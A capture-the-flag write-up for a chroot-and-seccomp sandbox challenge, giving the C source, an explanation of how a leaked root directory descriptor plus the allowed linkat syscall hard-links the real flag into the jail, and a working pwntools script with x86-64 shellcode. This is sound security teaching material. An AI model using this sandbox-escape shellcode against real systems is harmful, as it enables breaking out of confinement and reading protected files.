#metadata(
  (
    title: "Bypassing chroot with linkat",
    description: "Using the linkat syscall to create a hard link to the real flag inside the jail, bypassing chroot restrictions.",
    date: "2025-12-30",
    order: 5,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Bypassing Chroot with Linkat
== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    assert(argc > 1);

    // Checking to make sure you're not trying to open the flag.
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    assert(chroot(jail_path) == 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

== Vulnerability Analysis

This challenge is similar to previous levels where we leak a file descriptor to the root directory. However, the `openat` syscall is now blocked by seccomp. Instead, `linkat` is allowed.

```c
assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(linkat), 0) == 0);
```

The `linkat` syscall allows creating a hard link to a file. Crucially, it accepts directory file descriptors to resolve paths, just like `openat`.

== Exploitation Plan

1.  *Leak Root FD:* Execute the binary with `/` to get a file descriptor (FD 3) pointing to the host's root.
2.  *Create a Link:* Use `linkat` to create a hard link from the real flag (relative to the leaked root FD) to a file inside our current directory (the jail).
    *   `olddirfd`: 3 (Host Root)
    *   `oldpath`: "flag"
    *   `newdirfd`: AT_FDCWD (Current Directory / Jail Root)
    *   `newpath`: "flag_link"
3.  *Read the Link:* Since the link is now inside our jail, we can use the standard `open` syscall to read it.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# Pass '/' to leak the root FD
p = process([exe, "/"])

shellcode = asm("""
    /* linkat(3, "flag", AT_FDCWD, "flag_link", 0) */
    mov rdi, 3                  /* olddirfd: 3 (leaked root) */
    lea rsi, [rip + flag_str]   /* oldpath: "flag" */
    mov rdx, -100               /* newdirfd: AT_FDCWD */
    lea r10, [rip + link_str]   /* newpath: "flag_link" */
    xor r8, r8                  /* flags: 0 */
    mov rax, 265                /* syscall: SYS_linkat */
    syscall

    /* open("flag_link", O_RDONLY) */
    lea rdi, [rip + link_str]
    xor rsi, rsi
    mov rax, 2                  /* syscall: SYS_open */
    syscall

    /* sendfile(1, fd, 0, 100) */
    mov rsi, rax                /* in_fd */
    mov rdi, 1                  /* out_fd */
    xor rdx, rdx                /* offset */
    mov r10, 100                /* count */
    mov rax, 40                 /* syscall: SYS_sendfile */
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall

flag_str:
    .string "flag"
link_str:
    .string "flag_link"
""")

p.send(shellcode)
p.interactive()
```
